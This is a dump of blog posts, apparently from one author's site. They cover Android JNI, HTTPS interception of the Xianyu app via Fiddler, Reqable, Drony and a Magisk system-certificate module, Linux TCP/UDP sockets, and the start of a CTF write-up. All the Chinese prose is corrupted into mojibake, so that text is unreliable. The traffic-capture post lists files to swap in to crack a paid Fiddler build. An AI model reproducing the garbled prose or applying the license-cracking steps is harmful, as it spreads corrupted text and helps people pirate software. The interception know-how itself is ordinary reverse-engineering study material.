å¦‚ä¸‹ï¼Œåœ¨ MainActivity ä¸­çš„ onCreate ä¼šå¯¹å˜é‡ s èµ‹å€¼ package com.oacia.loadso;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; static &#123; try &#123; System.loadLibrary(\"oacia\"); &#125; catch (Exception ignored) &#123; &#125; &#125; String TAG = \"oacia_tag\"; public native void hello(); public String s = \"1234\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); s=\"change in create\"; hello(); &#125;&#125;åœ¨ JNI ä¸­ä¼šé€šè¿‡ jobject thiz è¯»å–å˜é‡ s #include &lt;jni.h>#include \"stdio.h\"extern \"C\"&#123;#include &lt;android/log.h>#define TAG \"oacia_tag\" // è¿™ä¸ªæ˜¯è‡ªå®šä¹‰çš„ LOG çš„æ ‡è¯†#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__) // å®šä¹‰ LOGD ç±»å‹#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG ,__VA_ARGS__) // å®šä¹‰ LOGI ç±»å‹#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,TAG ,__VA_ARGS__) // å®šä¹‰ LOGW ç±»å‹#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG ,__VA_ARGS__) // å®šä¹‰ LOGE ç±»å‹#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL,TAG ,__VA_ARGS__) // å®šä¹‰ LOGF ç±»å‹jint JNI_OnLoad(JavaVM* vm, void* reserved __unused)&#123; return JNI_VERSION_1_6;&#125;JNIEXPORT void JNICALLJava_com_oacia_loadso_MainActivity_hello(JNIEnv *env, jobject thiz) &#123; // TODO: implement hello() jclass clazz = env->GetObjectClass(thiz); jfieldID s_field = env->GetFieldID(clazz,\"s\",\"Ljava/lang/String;\"); jstring str = (jstring)env->GetObjectField(thiz,s_field); LOGD(\"%s\",env->GetStringUTFChars(str, nullptr));&#125;&#125;æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸè¯»å–å¹¶æ‰“å°å‡ºäº†ç»è¿‡ä¿®æ”¹åçš„å˜é‡ s çš„å€¼ # åŠ¨æ€æ³¨å†Œ åŠ¨æ€æ³¨å†Œéƒ½æ˜¯è°ƒç”¨ RegisterNatives æ¥å®ç°çš„ JNINativeMethod å†…æ•°ç»„çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä»£è¡¨ å‡½æ•°åç§° ï¼Œ å‡½æ•°ç­¾å ï¼Œ ä¸»ä½“å‡½æ•° jint RegisterNatives(JNIEnv *env) &#123; jclass clazz = env->FindClass(\"com/oacia/loadso/MainActivity\"); if (clazz == NULL) &#123; LOGE(\"con't find class: com/oacia/loadso/MainActivity\"); return JNI_ERR; &#125; JNINativeMethod methods_MainActivity[] = &#123; &#123;\"stringFromJNI\", \"()Ljava/lang/String;\", (void *) stringFromJNI&#125;, &#123;\"add\", \"(II)I\", (void *) add&#125; &#125;; // int len = sizeof(methods_MainActivity) / sizeof(methods_MainActivity[0]); return env->RegisterNatives(clazz, methods_MainActivity, sizeof(methods_MainActivity) / sizeof(methods_MainActivity[0]));&#125;# native å±‚è°ƒç”¨ java å±‚å‡½æ•° native è°ƒç”¨ java å±‚çš„å‡½æ•°åªéœ€è¦å››æ­¥å°±å¯ä»¥å®Œæˆ è·å– class è·å–å‡½æ•°ç­¾å è·å– class çš„å®ä¾‹ è°ƒç”¨å‡½æ•° jclass loadso = env->FindClass(\"com/oacia/loadso/MainActivity\");jmethodID MethodID = env->GetMethodID(loadso, \"logA\", \"()V\");jobject javaObject = env->AllocObject(loadso);env->CallVoidMethod(javaObject, MethodID);","categories":[],"tags":[]},{"title":"å®‰å“APPæŠ“åŒ…-ä»¥å’¸é±¼ä¸ºä¾‹","slug":"xianyu-capture","date":"2023-09-18T06:13:25.000Z","updated":"2023-10-31T14:33:51.862Z","comments":true,"path":"xianyu-capture/","link":"","permalink":"https://oacia.dev/xianyu-capture/","excerpt":"","text":"æœ€è¿‘æƒ³è¦ç ”ç©¶ä¸€ä¸‹å®‰å“ APP çš„æŠ“åŒ…ï¼Œæ­£å·§å¬è¯´ flutter åº”ç”¨éå¸¸éš¾æŠ“åŒ…ï¼Œäº†è§£äº†ä¸€ä¸‹åº”è¯¥æ˜¯ flutter åº”ç”¨ä¸èµ°ä»£ç†çš„åŸå› ï¼Œè€Œæ°å·§å’¸é±¼ APP å°±æ˜¯ç”¨ flutter å†™çš„ï¼Œæˆ‘å¯»æ€è¦æ˜¯æˆ‘è¿è¿™ä¹ˆéš¾æŠ“åŒ…çš„ APP éƒ½ä¼šæŠ“äº†ï¼Œé‚£ä¹ˆæœªæ¥å»æŠ“å…¶ä»– APP çš„åŒ…å²‚ä¸æ˜¯ä¿¡æ‰‹æ‹ˆæ¥ï½ # ç¯å¢ƒæ­å»º # fiddler 4.0.1 ç ´è§£ç‰ˆå·²ç»å¤±æ•ˆï¼Œå‹¿ç”¨ï¼æ­¤å¤„ä»…ä½œè®°å½• ä¸‹è½½åœ°å€ï¼Œéœ€è¦æ–­ç½‘å®‰è£…ï¼ # ç ´è§£æµç¨‹ é¦–å…ˆä¸‹è½½éœ€è¦æ›¿æ¢çš„ç»„ä»¶ï¼Œ ä¸‹è½½åœ°å€ ä¹‹åæ‰“å¼€ fiddler4.0.1, è¿æ¥ç½‘ç»œåï¼Œæ³¨å†Œç™»å½•è´¦å·ï¼Œç„¶åç‚¹å‡»åå¤©å…è´¹ä½¿ç”¨ éšåï¼Œæˆ‘ä»¬æ›¿æ¢æ‰ä¸‹åˆ—è·¯å¾„çš„æ–‡ä»¶ Fiddler Everywhere\\resources\\app\\out\\main.jsFiddler Everywhere\\resources\\app\\out\\WebServer\\ClientApp\\dist\\main.c5f6cd9850653179.jsFiddler Everywhere\\resources\\app\\out\\WebServer\\Fiddler.WebUi.dllFiddler Everywhere\\resources\\app\\out\\WebServer\\FiddlerBackendSDK.dllé¦–å…ˆå°†ç”µè„‘å’Œæ‰‹æœºè¿æ¥åˆ°åŒä¸€ä¸ªçƒ­ç‚¹ ç„¶åè¾“å…¥ ipconfig æŸ¥çœ‹ç”µè„‘çš„ IP éšåæ‰“å¼€ fiddler, ç‚¹å‡» Settings-&gt;Connections æŸ¥çœ‹ç›‘å¬ç«¯å£ ç‚¹å‡» Settings-&gt;HTTPs æ‰“å¼€ https æŠ“åŒ… è¿›å…¥æ‰‹æœºæµè§ˆå™¨ï¼Œè®¿é—®ç”µè„‘çš„ IP å’Œç«¯å£ 192.168.140.120:8866 , ç‚¹å‡» FiddlerRoot certificate è¿›è¡Œä¸‹è½½ åœ¨æ‰‹æœºä¸­è¿›å…¥ è®¾ç½®-&gt;å®‰å…¨-&gt;åŠ å¯†ä¸å‡­æ®-&gt;å®‰è£…è¯ä¹¦-&gt;CAè¯ä¹¦ é€‰æ‹© FiddlerRoot.cer.crt è¿›è¡Œå®‰è£… å¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç‚¹å‡» Fiddler çš„ Settings-&gt;HTTPS-&gt;Export root certificates(DER/Binary format) ä¸‹è½½åˆ°æ¡Œé¢ï¼Œç„¶å adb push åˆ°æ‰‹æœºä¸Šè¿›è¡Œå®‰è£… # reqable è¿›å…¥å®˜ç½‘è¿›è¡Œä¸‹è½½ åœ¨ Android è®¾å¤‡ä¸Šé…ç½® Wifi ä»£ç† é¦–å…ˆæˆ‘ä»¬éœ€è¦è®©ç”µè„‘å’Œæ‰‹æœºåœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸­ ç„¶ååœ¨ PC ä¸Šè¾“å…¥ ipconfig è·å¾—ä¸»æœº IP åœ¨æ‰‹æœºä¸Šä¸ºç½‘ç»œé…ç½®æ‰‹åŠ¨ä»£ç† éšåå°†å¯¼å‡ºè¯ä¹¦ ç„¶åå°†è¯ä¹¦ä¼ åˆ°æ‰‹æœºä¸Š åœ¨æ‰‹æœºä¸­è¿›å…¥ è®¾ç½®-&gt;å®‰å…¨-&gt;åŠ å¯†ä¸å‡­æ®-&gt;å®‰è£…è¯ä¹¦-&gt;CAè¯ä¹¦ é€‰æ‹© reqable-ca.crt è¿›è¡Œå®‰è£… # å®‰è£…è¯ä¹¦ä¸ºç³»ç»Ÿè¯ä¹¦ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æ­¤æ—¶å®‰è£…çš„è¯ä¹¦åªæ˜¯ç”¨æˆ·è¯ä¹¦ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†å…¶ç§»åŠ¨è‡³ç³»ç»Ÿè¯ä¹¦ æˆ‘ä»¬é¦–å…ˆä¸‹è½½å¹¶å®‰è£… FoxMagiskModuleManager ç„¶åä¸‹è½½ movecert zip çš„å‹ç¼©åŒ… ç„¶ååœ¨ FoxMagiskModuleManager æœ¬åœ°å®‰è£… éšåé‡å¯æ‰‹æœºï¼Œç”¨æˆ·è¯ä¹¦å°±ç§»åŠ¨åˆ°ç³»ç»Ÿè¯ä¹¦äº† # drony ä¸ fiddler é…åˆä½¿ç”¨ï¼Œè‹¥ä½¿ç”¨ reqable åˆ™æ— éœ€ä½¿ç”¨ drony!!! drony é€šè¿‡ä½¿ç”¨ VPN çš„æ‰‹æ®µï¼Œæˆªè·äº†è®¾ç½®çš„ APP çš„æ‰€æœ‰æµé‡ï¼Œå†å°†è¿™éƒ¨åˆ†æµé‡è½¬å‘åˆ° fiddler çš„ç›‘å¬ç«¯å£ï¼Œå¼ºåˆ¶è¿™éƒ¨åˆ†æµé‡é€šè¿‡ fiddlerï¼Œfiddler å°±èƒ½å¯¹æŠ“åˆ°çš„è¯·æ±‚è¿›è¡Œæˆªè· ä¸‹è½½åœ°å€ æ‰“å¼€ drony, å·¦æ»‘å±å¹•è½¬åˆ°è®¾ç½®ï¼Œç‚¹å‡»æ— çº¿ç½‘ç»œ é•¿æŒ‰å‘¼å‡ºèœå•ç‚¹å‡»ç¼–è¾‘ è®¾ç½®ä¸»æœºåå’Œç«¯å£ï¼Œå¹¶ä¸”ä»£ç†ç±»å‹éœ€è¦ä¸º æ™®é€šhttpä»£ç† å‘ä¸‹æ»‘åŠ¨ï¼Œæ‰¾åˆ° è¿‡æ»¤é»˜è®¤å€¼ ï¼Œå¹¶è®¾ç½®ä¸º å¼•å¯¼å…¨éƒ¨ ï¼Œéšåç‚¹å‡» è§„åˆ™ è¿›å…¥è½¬å‘è§„åˆ™è®¾ç½® ç‚¹å‡» ï¼‹ å·æ·»åŠ è§„åˆ™ é…ç½® è¡ŒåŠ¨ ä¸º æœ¬åœ°ä»£ç†é“¾å…¨éƒ¨ ï¼Œé€‰æ‹©åº”ç”¨ç¨‹åºä¸ºå’¸é±¼ï¼Œé…ç½®å®Œæˆåç‚¹å‡»å³ä¸Šè§’è¿›è¡Œä¿å­˜ è¿”å›ä¸»ç•Œé¢ï¼Œå¼€å¯è½¬å‘ # å¼€å§‹æŠ“åŒ… ä¸Šè¿°é…ç½®å®Œæˆä¹‹åï¼Œæ‰“å¼€å’¸é±¼ï¼Œå³å¯åœ¨ Fiddler æˆåŠŸæŠ“åŒ…ï¼ # å‚è€ƒèµ„æ–™ å®‰å“ APP æŠ“åŒ…æ•™ç¨‹ï¼ˆä¸€ï¼‰â€”â€” ä½¿ç”¨ fiddler æŠ“åŒ… å®‰å“ APP æŠ“åŒ…æ•™ç¨‹ï¼ˆäºŒï¼‰â€”â€” ä½¿ç”¨ drony é…åˆ fiddler æŠ“åŒ…","categories":[],"tags":[]},{"title":"linux socket TCP/UDPé€šä¿¡å­¦ä¹ ","slug":"linux-socket-tcp-udp","date":"2023-09-14T10:37:38.000Z","updated":"2023-09-18T12:10:39.635Z","comments":true,"path":"linux-socket-tcp-udp/","link":"","permalink":"https://oacia.dev/linux-socket-tcp-udp/","excerpt":"","text":"ä»¥å¾€å­¦ä¹ è¿‡ Windows ä¸­çš„ TCP/UDP socket é€šä¿¡ï¼Œä½†æ˜¯å½“æˆ‘ç ”ç©¶å®‰å“ä¸­çš„ tcp é€šä¿¡æ—¶ï¼Œå‘ç° C è¯­è¨€é€šä¿¡çš„è¯­æ³•æˆªç„¶ä¸åŒï¼Œç„¶åæ‰å‘ç°å®‰å“ç³»ç»Ÿä¸Šæ˜¯ Linux æ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥ä¹Ÿæœ‰å¿…è¦å»å¥½å¥½å­¦ä¹  Linux ç³»ç»Ÿä¸­çš„ tcp/udp é€šä¿¡ # socket API æ¥å£ # socket åˆ›å»ºä¸€ä¸ª socket å¥—æ¥å­— #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param domain: é€šä¿¡åè®®ç°‡@param type: æŒ‡å®š socket ç±»å‹@param protocol: æŒ‡å®šåè®®ï¼Œå½“ protocol ä¸º 0 æ—¶ï¼Œä¼šè‡ªåŠ¨é€‰æ‹© type ç±»å‹å¯¹åº”çš„é»˜è®¤åè®®@return: åˆ›å»ºæˆåŠŸè¿”å›ä¸€ä¸ª socket å¥—æ¥å­—ï¼Œåˆ›å»ºå¤±è´¥è¿”å› - 1*/int socket(int domain, int type, int protocol);domain åç§° å€¼ å«ä¹‰ AF_UNSPEC 0 AF_UNIX 1 Unix domain sockets AF_LOCAL 1 POSIX name for AF_UNIX AF_INET 2 Internet IP Protocol, IPv4 AF_AX25 3 Amateur Radio AX.25 AF_IPX 4 Novell IPX AF_APPLETALK 5 AppleTalk DDP AF_NETROM 6 Amateur Radio NET/ROM AF_BRIDGE 7 Multiprotocol bridge AF_ATMPVC 8 ATM PVCs AF_X25 9 Reserved for X.25 project AF_INET6 10 IPv6 AF_ROSE 11 Amateur Radio X.25 PLP AF_DECnet 12 Reserved for DECnet project AF_NETBEUI 13 Reserved for 802.2LLC project AF_SECURITY 14 Security callback pseudo AF AF_KEY 15 PF_KEY key management API AF_NETLINK 16 AF_ROUTE AF_NETLINK Alias to emulate 4.4BSD AF_PACKET 17 Packet family AF_ASH 18 Ash AF_ECONET 19 Acorn Econet AF_ATMSVC 20 ATM SVCs AF_RDS 21 RDS sockets AF_SNA 22 Linux SNA Project (nutters!) AF_IRDA 23 IRDA sockets AF_PPPOX 24 PPPoX sockets AF_WANPIPE 25 Wanpipe API Sockets AF_LLC 26 Linux LLC AF_IB 27 Native InfiniBand address AF_MPLS 28 MPLS AF_CAN 29 Controller Area Network AF_TIPC 30 TIPC sockets AF_BLUETOOTH 31 Bluetooth sockets AF_IUCV 32 IUCV sockets AF_RXRPC 33 RxRPC sockets AF_ISDN 34 mISDN sockets AF_PHONET 35 Phonet sockets AF_IEEE802154 36 IEEE802154 sockets AF_CAIF 37 CAIF sockets AF_ALG 38 Algorithm sockets AF_NFC 39 NFC sockets AF_VSOCK 40 vSockets AF_KCM 41 Kernel Connection Multiplexor AF_QIPCRTR 42 Qualcomm IPC Router type åç§° å€¼ å«ä¹‰ å¯¹åº”çš„åè®® SOCK_STREAM 1 stream (connection) socket TCP SOCK_DGRAM 2 datagram (conn.less) socket UDP SOCK_RAW 3 raw socket ICMP SOCK_RDM 4 reliably-delivered message SOCK_SEQPACKET 5 sequential packet socket SCTP SOCK_DCCP 6 Datagram Congestion Control Protocol socket DCCP SOCK_PACKET 10 linux specific way of getting packets at the dev level. # bind å½“ç”¨ socket å‡½æ•°åˆ›å»ºå¥—æ¥å­—åï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ bind å‡½æ•°æ¥å°†æŒ‡å®šçš„ IP å’Œç«¯å£åˆ†é…ç»™å·²ç»åˆ›å»ºçš„ socket #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: socket å‡½æ•°è¿”å›çš„ socket å¥—æ¥å­—@param addr: å«æœ‰è¦ç»‘å®šçš„ IP å’Œç«¯å£çš„åœ°å€ç»“æ„æŒ‡é’ˆ@param addrlen: addr çš„å¤§å°ï¼Œä¸€èˆ¬ä½¿ç”¨ sizeof æ¥è¿›è¡Œè®¡ç®—@return: æˆåŠŸè¿”å› 0, å¤±è´¥è¿”å› - 1*/int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);addr IPv4 å®šä¹‰çš„ç±»å‹ä¸º struct sockaddr_in struct sockaddr_in &#123; sa_family_t sin_family; /* address family: AF_INET */ in_port_t sin_port; /* port in network byte order */ struct in_addr sin_addr; /* internet address */&#125;; /* Internet address. */struct in_addr &#123; uint32_t s_addr; /* address in network byte order */&#125;; IPv6 å®šä¹‰çš„ç±»å‹ä¸º sockaddr_in6 struct sockaddr_in6 &#123; sa_family_t sin6_family; /* AF_INET6 */ in_port_t sin6_port; /* port number */ uint32_t sin6_flowinfo; /* IPv6 flow information */ struct in6_addr sin6_addr; /* IPv6 address */ uint32_t sin6_scope_id; /* Scope ID (new in 2.4) */ &#125;; struct in6_addr &#123; unsigned char s6_addr[16]; /* IPv6 address */ &#125;; Unix å®šä¹‰çš„ç±»å‹ä¸º sockaddr_un #define UNIX_PATH_MAX 108struct sockaddr_un &#123; sa_family_t sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ &#125;; åœ¨å°† ip å’Œ port ç»‘å®šåˆ° socket æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†ä¸»æœºå­—èŠ‚åº (å°ç«¯åº) è½¬æ¢æˆç½‘ç»œå­—èŠ‚åº (å¤§ç«¯åº), é€šå¸¸ä¼šä½¿ç”¨åˆ°çš„å‡½æ•°æœ‰ htonl , inet_addr , htons htonl(INADDR_ANY);//Host to Network Long,INADDR_ANY é€šå¸¸ä¸º 0, ç›¸å½“äº inet_addr (\"0.0.0.0\"), å³ç›‘å¬æ¥è‡ªæ‰€æœ‰ IP çš„è¿æ¥inet_addr(\"127.0.0.1\");// å°†ç‚¹åˆ†åè¿›åˆ¶ IP åœ°å€è½¬æ¢æˆç½‘ç»œå­—èŠ‚åº IP åœ°å€htons(6666);//Host to Network Short, ç”¨æ¥è½¬æ¢ port# listen æœåŠ¡ç«¯ä½¿ç”¨ listen æ¥å»ºç«‹ä¸€ä¸ªç›‘å¬å®¢æˆ·ç«¯è¿æ¥çš„é˜Ÿåˆ— #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: ç›‘å¬çš„ socket æè¿°ç¬¦@param backlog: å»ºç«‹çš„æœ€å¤§è¿æ¥æ•°@return: æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› -1ï¼Œå¹¶è®¾ç½® erron */int listen(int sockfd, int backlog);# accept æœåŠ¡ç«¯æ¥å—å®¢æˆ·ç«¯çš„è¿æ¥ #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: ç›‘å¬çš„ socket æè¿°ç¬¦@param addr: ä¿å­˜è¿æ¥çš„å®¢æˆ·ç«¯çš„åœ°å€ä¿¡æ¯@param addrlen: addr çš„å¤§å°ï¼Œä¸€èˆ¬ä½¿ç”¨ sizeof æ¥è¿›è¡Œè®¡ç®—@return: æˆåŠŸè¿”å›å®¢æˆ·ç«¯çš„ socket æ–‡ä»¶æè¿°å­—ï¼Œå¤±è´¥è¿”å› -1ï¼Œè®¾ç½® erron */int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);# connect å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è¿æ¥è¯·æ±‚ #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: ç›‘å¬çš„ socket æè¿°ç¬¦@param addr: ä¿å­˜è¿æ¥çš„å®¢æˆ·ç«¯çš„åœ°å€ä¿¡æ¯@param addrlen: addr çš„å¤§å°ï¼Œä¸€èˆ¬ä½¿ç”¨ sizeof æ¥è¿›è¡Œè®¡ç®—@return: æˆåŠŸè¿”å›å®¢æˆ·ç«¯çš„ socket æ–‡ä»¶æè¿°å­—ï¼Œå¤±è´¥è¿”å› -1ï¼Œè®¾ç½® erron */int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);# send, sendto å‘é€æ•°æ® #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: æ¥å—æ•°æ®çš„ socket@param buf: å‘é€çš„æ•°æ®@param len: æ•°æ®é•¿åº¦@param flags: å½“è¿™ä¸ªå‚æ•°ä¸º 0ï¼Œè¯¥å‡½æ•°ç­‰ä»·ä¸ write@return: æˆåŠŸè¿”å›å‘é€çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥è¿”å› -1ï¼Œå¹¶è®¾ç½® erron */ssize_t send(int sockfd, const void *buf, size_t len, int flags);/* sendto åŠŸèƒ½æ˜¯å°†æ•°æ®å‘é€åˆ°æŒ‡å®šçš„åœ°å€ dest_addrï¼Œå…¶ä»–å‚æ•°åŸºæœ¬ç›¸åŒ */ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);# recv, recvfrom æ¥æ”¶æ•°æ® #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: æ¥æ”¶çš„ socket fd@param buf: æ¥æ”¶ç¼“å†²åŒº@param len: ç¼“å†²åŒºé•¿åº¦@param flags: å½“è¿™ä¸ªå‚æ•°ä¸º 0ï¼Œè¯¥å‡½æ•°ç­‰ä»·ä¸ read@return: æˆåŠŸè¿”å›æ¥å—çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥è¿”å› -1ï¼Œå¹¶è®¾ç½® erron */ssize_t recv(int sockfd, void *buf, size_t len, int flags);/* recvfrom ä»æŒ‡å®šçš„åœ°å€ src_addr æ¥æ”¶æ•°æ®ï¼Œå…¶ä»–å‚æ•°ä¸ recv ç±»ä¼¼ */ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);# close å…³é—­ç”± accept æˆ–è€… connect è¿”å›çš„ socket æè¿°å­— #include &lt;unistd.h>int close(int fd);# ä½¿ç”¨ Socket è¿›è¡Œ TCP é€šä¿¡ # TCP æœåŠ¡ç«¯ // tcp-server.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>int main(void) &#123; int server_fd, client_fd; struct sockaddr_in listen_addr; listen_addr.sin_family = AF_INET;// ä½¿ç”¨ IPv4 åœ°å€ listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);//INADDR_ANY è¡¨ç¤ºä¸ç®¡æ˜¯å“ªä¸ªç½‘å¡æ¥æ”¶åˆ°æ•°æ®ï¼Œåªè¦ç›®çš„ç«¯å£æ˜¯ SERV_PORTï¼Œå°±ä¼šè¢«æœåŠ¡ç«¯æ¥æ”¶åˆ° listen_addr.sin_port = htons(8888); //create socket server_fd = socket(AF_INET, SOCK_STREAM, 0); //bind listen_addr to server_fd bind(server_fd, (struct sockaddr *)&amp;listen_addr, sizeof(listen_addr)); //listen server_fd, max listen client num = 10 listen(server_fd, 10); printf(\"TCP server is listening...\\n\"); char send_msg[] = \"hello client\"; while(1) &#123; //accept client connect client_fd = accept(server_fd, (struct sockaddr *)NULL, NULL); //send data send(client_fd, send_msg, sizeof(send_msg), 0); printf(\"Write \\\"hello client\\\" to client ok.\\n\"); //close client fd close(client_fd); &#125; //close server fd close(server_fd); return 0;&#125;# TCP å®¢æˆ·ç«¯ //tcp-client.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>#include &lt;netinet/in.h>#include &lt;netdb.h>int main() &#123; int client_fd = 0; struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); server_addr.sin_port = htons(8888); //create socket client_fd = socket(AF_INET, SOCK_STREAM, 0); //connect server connect(client_fd, (struct sockaddr *)&amp;server_addr, sizeof(server_addr)); //recv msg from server char msg_buf[100] = &#123; 0 &#125;; recv(client_fd, msg_buf, 100, 0); printf(\"Client get server msg: %s\\n\", msg_buf); //close fd close(client_fd); return 0;&#125;# ä½¿ç”¨ Socket è¿›è¡Œ UDP é€šä¿¡ # UDP æœåŠ¡ç«¯ // udp-server.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>int main(void) &#123; int server_fd, client_fd; struct sockaddr_in listen_addr; listen_addr.sin_family = AF_INET;// ä½¿ç”¨ IPv4 åœ°å€ listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);//INADDR_ANY è¡¨ç¤ºä¸ç®¡æ˜¯å“ªä¸ªç½‘å¡æ¥æ”¶åˆ°æ•°æ®ï¼Œåªè¦ç›®çš„ç«¯å£æ˜¯ SERV_PORTï¼Œå°±ä¼šè¢«æœåŠ¡ç«¯æ¥æ”¶åˆ° listen_addr.sin_port = htons(8888); //create socket server_fd = socket(AF_INET, SOCK_DGRAM, 0); //bind server_addr to server_fd bind(server_fd, (struct sockaddr *)&amp;listen_addr, sizeof(listen_addr)); //recv msg from client struct sockaddr_in client_addr; char msg_buf[100] = &#123; 0 &#125;; recvfrom(server_fd, msg_buf, 100, 0, (struct sockaddr *)&amp;client_addr, (socklen_t *)sizeof(client_addr)); printf(\"Client get server msg: %s\\n\", msg_buf); //close server fd close(server_fd); return 0;&#125;# UDP å®¢æˆ·ç«¯ //udp-client.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>#include &lt;netinet/in.h>#include &lt;netdb.h>int main() &#123; int client_fd = 0; struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); server_addr.sin_port = htons(8888); //create socket client_fd = socket(AF_INET, SOCK_DGRAM, 0); //send data char send_msg[] = \"hello server\"; sendto(client_fd, send_msg, sizeof(send_msg), 0, (struct sockaddr *)&amp;server_addr, sizeof(server_addr)); printf(\"Write \\\"hello server\\\" to server ok.\\n\"); //close fd close(client_fd); return 0;&#125;# å‚è€ƒèµ„æ–™ Linux é«˜çº§ç¼–ç¨‹ - Socket ç¼–ç¨‹åŸºç¡€ï¼ˆTCPï¼ŒUDPï¼‰ socket æ¥å£çš„ç½‘ç»œåè®®æ— å…³æ€§ ä¸€æ–‡ææ‡‚ Linux çš„ Socket ç¼–ç¨‹åŸç† (å«å®ä¾‹è§£æ)","categories":[],"tags":[]},{"title":"ç»†å“sec2023å®‰å“èµ›é¢˜","slug":"sec-2023","date":"2023-08-31T00:19:57.000Z","updated":"2024-07-12T03:12:41.189Z","comments":true,"path":"sec-2023/","link":"","permalink":"https://oacia.dev/sec-2023/","excerpt":"","text":"# å‰è¨€ åœ¨ä»Šå¹´ä¸‰æœˆä»½çš„æ—¶å€™ï¼Œæˆ‘å‚åŠ äº†è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›ï¼Œåˆ°ç°åœ¨å·®ä¸å¤šå¿«è¿‡å»åŠå¹´äº†ï¼Œå½“æ—¶åšè¿™é“å®‰å“åˆèµ›é¢˜ç›®æ—¶ï¼Œä¹Ÿæ˜¯å¡åœ¨å¼€å¤´å°±æ¯«æ— å¤´ç»ªäº†ï¼Œè€Œåçœ‹åˆ°çœ‹é›ªä¸Šçš„ä¸‰ä½å¤§ä½¬ |_|sher å¸ˆå‚…ï¼Œjuice4fun å¸ˆå‚…å’Œ fallw1nd å¸ˆå‚…éƒ½åˆ†äº«äº†ä»–ä»¬åšè¿™é“é¢˜ç›®æ—¶çš„è§£é¢˜è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯è®©æˆ‘é‡æ‹¾äº†åšå‡ºè¿™é“å®‰å“åˆèµ›é¢˜çš„ä¿¡å¿ƒï¼Œå› ä¸ºéœ€è¦åˆ†å¿ƒåœ¨å­¦ä¹ å’Œå…¶ä»–äº‹æƒ…ä¸Šï¼Œæ‰€ä»¥ä»ä¸‰æœˆä»½åˆ°ä¸ƒæœˆä»½ä¹Ÿæ˜¯é™†é™†ç»­ç»­å¤ç°äº†äº”ä¸ªæœˆï¼Œä¸€è·¯ä¸Šèµ°èµ°åœåœ ç»ˆäºåœ¨å…«æœˆä»½ï¼Œæˆ‘éš¾èƒ½å¯è´µçš„è·å¾—äº†æ•´æ•´ä¸€ä¸ªæœˆçš„å……è£•æ—¶é—´ï¼Œè¿™ä¹Ÿè®©æˆ‘å¯ä»¥å¥½å¥½å»é’»ç ”è¿™é“å¯¹æˆ‘æ¥è¯´éš¾åº¦æå¤§çš„å®‰å“é¢˜ç›®äº†ï¼Œè§£é¢˜çš„è¿‡ç¨‹ä¸­åŸºæœ¬ä¸ŠæŠŠæˆ‘èƒ½æƒ³åˆ°çš„å®‰å“é€†å‘å·¥å…·ç”¨äº†ä¸ªéï¼Œæ¯å½“æˆ‘åœ¨è§£é¢˜çš„è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæ—¶ï¼Œæˆ‘æ€»ä¼šæŠŠè¿™ä¸‰ä½å¤§ä½¬çš„ writeup æ‰“å¼€æ¥åå¤è§‚æ‘©ç ”ç©¶æ€è€ƒä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Œæ€ä¹ˆåšæ•ˆæœä¼šæ›´å¥½ 